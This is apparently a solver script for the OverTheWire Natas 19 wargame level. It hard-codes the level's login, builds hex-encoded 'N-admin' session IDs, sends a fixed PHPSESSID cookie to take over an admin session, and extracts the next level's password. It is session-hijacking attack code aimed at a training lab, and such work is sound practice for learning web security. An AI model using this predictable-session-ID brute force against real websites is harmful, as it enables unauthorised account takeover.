import requests
import re
import binascii


username ='natas19'
password ='4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()

for i in range(1):
    
    phpid = (str(i) + "-admin").encode("utf-8").hex()
    print(phpid) 
    # cookies = {"PHPSESSID":phpid}
    
    cookies = {"PHPSESSID":"3238312d61646d696e"}
    responce = session.get(url,cookies=cookies,auth = (username,password))
    # responce = session.post(url,data = {"username":"test","password":"pass"},auth=(username,password))
    content = responce.text
    
    # printhex = bytes.fromhex(str(session.cookies["PHPSESSID"])).decode('utf-8')
    # print(session.cookies["PHPSESSID"])
    if "You are an admin" in content:
        print("gotit")
        print(content)
        print("password for natas 20 is = "+re.findall("Password: (.*)</pre></div>",content)[0])
    